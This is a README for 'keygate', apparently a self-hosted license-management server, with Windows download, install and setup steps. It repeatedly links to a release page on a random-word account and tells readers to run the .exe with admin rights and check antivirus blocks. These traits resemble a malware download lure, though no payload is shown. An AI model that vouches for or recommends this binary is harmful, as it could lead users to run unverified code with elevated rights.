# 🔐 keygate - Simple license control for teams

[![Download keygate](https://img.shields.io/badge/Download%20keygate-blue-grey)](https://github.com/masseuseherpetology481/keygate/releases)

## 🚀 Overview

keygate is a license management tool for Windows and other systems. It helps you set up subscriptions, trials, perpetual licenses, floating licenses, and team seats. It also supports usage metering and payment flows with Stripe and PayPal.

Use it when you need a self-hosted license server that keeps your software access in one place. It runs as one binary with one database, which keeps setup simple.

## 🖥️ What you need

Before you start, make sure you have:

- A Windows PC with admin access
- An internet connection for the first download
- At least 2 GB of free disk space
- 4 GB of RAM or more
- A modern browser for the admin dashboard
- A database file or database server, based on your setup

If you plan to run it on one machine, a basic Windows desktop or server is enough for testing and small teams.

## 📥 Download keygate

Visit this page to download keygate:

https://github.com/masseuseherpetology481/keygate/releases

On that page:

1. Open the latest release
2. Download the Windows file
3. Save it to a folder you can find, such as Downloads or Desktop

If you see more than one file, choose the Windows build that matches your system. In most cases, that will be the `.exe` file or the Windows zip package.

## 🧰 Install on Windows

Follow these steps to set it up on your PC:

1. Go to the download page
2. Download the Windows release file
3. If the file is zipped, right-click it and choose **Extract All**
4. Open the extracted folder
5. Double-click the keygate file to start it
6. If Windows asks for permission, choose **Yes**
7. Keep the window open while the service starts

If you placed the file on your Desktop, it will be easier to find later. You can also pin it to Start after the first run.

## ⚙️ First-time setup

After keygate starts, you will need to set the basics:

1. Open your browser
2. Go to the local address shown in the app window
3. Sign in to the admin dashboard
4. Set your company name
5. Add your database details
6. Save your settings

If the app starts with a setup screen, follow the prompts on screen. If it starts in the background, look for the local web address in the console window or status area.

## 🔑 What you can manage

keygate helps you handle common licensing tasks in one place:

- **Subscriptions** for recurring access
- **Perpetual licenses** for one-time purchases
- **Trials** for time-limited access
- **Floating licenses** for shared use across a team
- **Team seats** for user-based access
- **Usage metering** for tracked consumption
- **Payments** through Stripe and PayPal
- **Admin dashboard** for daily control

This makes it easier to manage customers, plans, and license rights without switching tools.

## 🧭 Basic daily use

Once it is running, you can use the dashboard to:

1. Create a product
2. Add a license plan
3. Set trial rules
4. Assign seats to users
5. Track usage
6. Review payment records
7. Check license status
8. Change settings when needed

If you manage software for clients, this gives you a central place to see who has access and which license type they use.

## 🔍 Common Windows checks

If the app does not open, check these items:

- Make sure the file finished downloading
- Confirm you extracted the zip file if it came as an archive
- Run the app as an administrator
- Check that Windows Defender or antivirus did not block it
- Make sure no other app is using the same port
- Restart the app after changing settings

If the dashboard does not load in your browser, refresh the page after a few seconds.

## 🧩 Using it with your software

keygate fits into a typical software release flow:

1. Your app checks a license key
2. keygate verifies the key
3. The app gets access rules back
4. The app allows or blocks features
5. Usage data can be sent back for metering

This setup works for desktop tools, internal apps, and subscription products that need license control.

## 🔐 License types at a glance

Here is how the main license types work:

- **Trial**: lets someone try your product for a set time
- **Subscription**: stays active while payments continue
- **Perpetual**: gives long-term access after one purchase
- **Floating**: limits how many people can use the software at once
- **Seat-based**: ties use to named users or seats
- **Metered**: tracks how much of a service someone uses

You can choose one model or mix several for different products.

## 💳 Payments and billing

If you use online billing, keygate can connect to:

- Stripe
- PayPal

That lets you link license access to paid plans. You can use it for recurring billing, one-time purchases, or account-based access.

## 🗂️ Typical folder layout

After install, you may see files like these:

- `keygate.exe` for the app
- a config file for settings
- a database file or connection file
- logs for troubleshooting
- a folder for uploads or stored data

Keep the app files in one place so they are easy to update and back up.

## 🔄 Updates

When a new release is available:

1. Go to the release page
2. Download the new Windows file
3. Close the current app
4. Replace the old file with the new one
5. Start the app again

If you use a database file, keep a copy before you update. That gives you a safe restore point.

## 🛠️ If you need help getting started

If you are new to license tools, start with these steps:

1. Install the app
2. Open the dashboard
3. Create one test product
4. Add one test license
5. Check that the license response works in your app
6. Add payment settings last

This keeps the first setup small and easier to manage.

## 📌 Best use cases

keygate works well for:

- Independent software vendors
- Small SaaS teams
- Internal tools with access rules
- Desktop apps with license keys
- Products that need trials and paid plans
- Teams that need seat control
- Apps that track usage

## 🧪 Quick test plan

Use this simple test after setup:

1. Create a trial license
2. Open your app with that license
3. Confirm the license is accepted
4. Change the license status to inactive
5. Check that your app blocks access
6. Create a floating license
7. Test access from more than one device
8. Review the usage record

This helps you confirm that the main parts work before you go live

## 📎 Download again

If you need the release page again, use this link:

[https://github.com/masseuseherpetology481/keygate/releases](https://github.com/masseuseherpetology481/keygate/releases)

## 🧱 Project details

- Repository name: keygate
- Type: open source license management platform
- Main use: license control and access management
- Deployment style: self-hosted
- Stack note: one binary, one database
- Topic area: licensing, entitlements, subscriptions, seats, floating use, and metering